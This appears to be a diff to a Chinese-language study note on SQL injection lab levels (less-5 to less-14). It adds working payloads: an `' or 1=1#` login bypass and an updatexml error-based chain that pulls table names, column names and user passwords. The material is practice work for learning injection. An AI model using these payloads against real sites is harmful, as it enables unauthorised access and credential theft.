@@ -63,7 +63,7 @@ category: 笔记
 
 注：联合注入语法为`union select 1,2,3 from...where...`不要把回显数字标错地方
 
-注：因为显示只有两个，但我们查询的数据不止两条，因此要用`group_concat`函数将表名等内容连接成一整行显示
+注：因为显示数据的地方只有个，但我们查询的数据不止一条，因此要用`group_concat`函数将表名等内容连接成一整行显示
 
 列名：
 
@@ -94,6 +94,14 @@ category: 笔记
 ## less-5~6
 
 //concat 与 groupc_concat的区别
+
+//updatexml()语法 0x7e 的作用，可以换成什么'~'
+
+//(select...)括号的作用
+
+//username,' ',password ' '的作用
+
+//数据显示不全的原因及解决办法
 
 # GET-布尔盲注
 
@@ -344,9 +352,7 @@ category: 笔记
     username：' or 1=1#    
     password:123456       
 
-`' or 1=1#`是万能密码，保证`username`一定是对的
-
-`#`把`password`那一部分的验证条件注释掉了，因此无论我们在`password`这一栏输入什么都是正确的
+注：`' or 1=1#`是万能密码，保证`username`一定是对的，开头的闭合方式`'`不是一成不变的，要根据不同的闭合方式更改
 
 less-11后端大致代码：
 
@@ -357,6 +363,8 @@ less-11后端大致代码：
     echo "Your Login name: " . $row['username']; 
     echo "Your Password: " . $row['password']; 
     }
+
+注：可以看到，`#`会把`password`那一部分的验证条件注释掉，因此无论我们在`password`这一栏输入什么都是正确的。这一栏基本不用管，留空就行，只在`username`这一栏输入查询语句
 
 输入后我们可以看到页面有回显
 
@@ -397,3 +405,65 @@ less-11后端大致代码：
     ' union select group_concat(username,' ',password),1 from users #
 
 ![](https://picgocloud.com/m/454e5df3-9f83-49bb-8137-d9957bf17714.png)
+
+## less-12
+
+闭合方式：`")`
+
+# POST-报错注入
+
+## less-13
+
+**1.判断闭合方式**
+
+经过尝试发现闭合方式：`')`
+
+**2.判断有无回显**
+
+在`username`输入框输入万能密码：
+
+    ') or 1=1 #
+
+![](https://picgocloud.com/m/7d9c84d7-8851-4ea8-bf08-0721170705ee.png)
+
+发现页面并没有返回信息，因此可以考虑报错注入或盲注
+
+**3.判断报错是否返回错误信息**
+
+在输入框输入
+
+    ') and updatexml(1,concat('~',(select database())),1)#
+
+![](https://picgocloud.com/m/4dd3d7eb-46c2-427b-8565-71ee1dded011.png)
+
+发现页面返回错误信息，因此我们使用报错注入
+
+**4.获取表名**
+
+因为我们在上一步判断是否返回报错信息时已经得到了库名，所以这一步我们直接获取表名
+
+输入
+
+    ') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
+
+![](https://picgocloud.com/m/275951f9-458e-4375-a10b-d973b135c234.png)
+
+**5.获取字段**
+
+输入
+
+    ') and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)#
+
+![](https://picgocloud.com/m/6569dc85-836b-4198-aeb7-c1f38abdfec2.png)
+
+**6.获取数据**
+
+输入
+
+    ') and updatexml(1,concat('~',(select group_concat(username,' ',password) from users)),1)#
+
+![](https://picgocloud.com/m/16d4e577-5e2c-4adb-b232-645ecd4965eb.png)
+
+## less-14
+
+闭合方式：`"`
